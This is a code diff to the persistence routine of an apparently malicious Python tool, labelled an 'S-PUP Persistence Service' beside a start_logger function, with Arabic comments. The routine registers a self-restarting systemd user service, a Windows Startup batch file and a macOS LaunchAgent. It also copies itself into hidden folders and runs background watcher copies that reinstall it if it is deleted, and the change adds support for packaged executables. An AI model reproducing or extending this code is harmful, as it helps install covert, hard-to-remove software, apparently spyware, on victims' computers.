@@ -271,19 +271,23 @@ def start_logger():
 def persist_script(output_filename):
     system = platform.system()
 
+    # معرفة المسار الحقيقي للملف الجاري تشغيله
+    if getattr(sys, 'frozen', False):
+        current_path = sys.executable  # عند التحويل إلى exe أو app أو bin
+    else:
+        current_path = os.path.abspath(__file__)  # أثناء التشغيل كـ .py
+
+    basename = os.path.basename(current_path)
+
     if system == "Linux":
         print("[*] System: Linux - Setting up systemd service...")
 
         user_service_path = os.path.expanduser("~/.config/systemd/user")
         os.makedirs(user_service_path, exist_ok=True)
 
-        # اسم الخدمة بناءً على اسم الملف
         service_name = os.path.splitext(output_filename)[0] + ".service"
         service_file_path = os.path.join(user_service_path, service_name)
-
-        # المسار الكامل للسكربت
         script_path = os.path.abspath(output_filename)
-
 
         service_content = f"""[Unit]
 Description=S-PUP Persistence Service for {output_filename}
@@ -292,7 +296,7 @@ After=network.target
 [Service]
 Type=simple
 WorkingDirectory={os.path.dirname(script_path)}
-ExecStart=/usr/bin/python3 {script_path}
+ExecStart={sys.executable if getattr(sys, 'frozen', False) else '/usr/bin/python3'} {script_path}
 Restart=always
 RestartSec=10
 
@@ -300,25 +304,17 @@ RestartSec=10
 WantedBy=default.target
 """
 
-        # إنشاء ملف الخدمة
         with open(service_file_path, 'w') as f:
             f.write(service_content)
 
         print(f"[+] Service created: {service_file_path}")
 
-        # إعادة تحميل الخدمات الخاصة بالمستخدم
         subprocess.run(["systemctl", "--user", "daemon-reload"])
-
-        # تفعيل وتشغيل الخدمة
         subprocess.run(["systemctl", "--user", "enable", service_name])
         subprocess.run(["systemctl", "--user", "start", service_name])
 
         print(f"[+] Service {service_name} enabled and started.")
-        
-        filename = os.path.abspath(__file__)
-        basename = os.path.basename(filename)
 
-    # قائمة مسارات خفية لا تحتاج صلاحيات root وتوجد دائمًا في أنظمة Linux
         hidden_paths = [
             os.path.expanduser("~/.config/.cache/"),
             os.path.expanduser("~/.local/share/.logs/"),
@@ -332,47 +328,43 @@ WantedBy=default.target
                 os.makedirs(path, exist_ok=True)
                 target_file = os.path.join(path, basename)
                 if not os.path.isfile(target_file):
-                    shutil.copy2(filename, target_file)
+                    shutil.copy2(current_path, target_file)
                     print(f"[+] Script copied to: {target_file}")
             except Exception as e:
                 print(f"[-] Error copying to {path}: {e}")
 
-    
-    #  ( حراس ) إطلاق النسخ الاحتياطية كمراقبين فقط
         def launch_backup_watchers(hidden_paths):
             for path in hidden_paths:
-                target = os.path.join(path, os.path.basename(__file__))
+                target = os.path.join(path, basename)
                 if os.path.isfile(target):
-                    subprocess.Popen(["/usr/bin/python3", target, "--watcher"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    subprocess.Popen(
+                        [target, "--watcher"] if getattr(sys, 'frozen', False)
+                        else ["/usr/bin/python3", target, "--watcher"],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         def watch_primary_script():
             while True:
                 if not os.path.isfile(script_path):
                     print("[!] Primary script missing. Promoting self to primary...")
                     try:
-                # نسخ نفسه إلى مكان السكربت الأصلي
-                        shutil.copy2(__file__, script_path)
-
-                # إعادة تفعيل الخدمة
+                        shutil.copy2(current_path, script_path)
                         subprocess.run(["systemctl", "--user", "enable", service_name])
                         subprocess.run(["systemctl", "--user", "start", service_name])
                         print("[+] Recovery completed by watcher.")
-
-                        break  # توقف بعد النجاح
+                        break
                     except Exception as e:
                         print(f"[-] Recovery failed: {e}")
-
-                time.sleep(60)  # راقب كل دقيقة
-
-                
+                time.sleep(60)
 
     elif system == "Windows":
         print("[*] System: Windows - Setting up Startup script...")
         startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+        os.makedirs(startup_folder, exist_ok=True)
         target_path = os.path.join(startup_folder, f"{output_filename}.bat")
         with open(target_path, 'w') as f:
-            pythonw_path = shutil.which("pythonw") or "python"
-            f.write(f"@echo off\nstart {pythonw_path} {os.path.abspath(output_filename)}\n")
+            exe_path = sys.executable if getattr(sys, 'frozen', False) else (shutil.which("pythonw") or "python")
+            f.write(f"@echo off\nstart \"\" \"{exe_path}\" \"{os.path.abspath(output_filename)}\"\n")
+        print(f"[+] Startup script created: {target_path}")
 
     elif system == "Darwin":
         print("[*] System: macOS - Setting up Launch Agent...")
@@ -381,35 +373,33 @@ WantedBy=default.target
 
         plist_file_path = os.path.join(launch_agents_path, f"com.{os.path.splitext(output_filename)[0]}.plist")
 
+        executable = sys.executable if getattr(sys, 'frozen', False) else "/usr/bin/python3"
+
         plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
-        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-        <plist version="1.0">
-        <dict>
-            <key>Label</key>
-            <string>com.{os.path.splitext(output_filename)[0]}</string>
-            <key>ProgramArguments</key>
-            <array>
-                <string>/usr/bin/python3</string>
-                <string>{os.path.abspath(output_filename)}</string>
-            </array>
-            <key>RunAtLoad</key>
-            <true/>
-        </dict>
-        </plist>
-        """
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.{os.path.splitext(output_filename)[0]}</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{executable}</string>
+        <string>{os.path.abspath(output_filename)}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>
+"""
 
         with open(plist_file_path, 'w') as f:
             f.write(plist_content)
 
-        # تحميل الـ plist لتشغيله فورًا
-        subprocess.run(["launchctl", "load", plist_file_path])
-
-        print(f"[+] Launch Agent created: {plist_file_path}")
         try:
             subprocess.run(["launchctl", "load", plist_file_path], check=True)
+            print(f"[+] Launch Agent created and loaded: {plist_file_path}")
         except subprocess.CalledProcessError:
             print("[!] Failed to load LaunchAgent. Check permissions or SIP settings.")
-
 
 def is_admin():
     try:
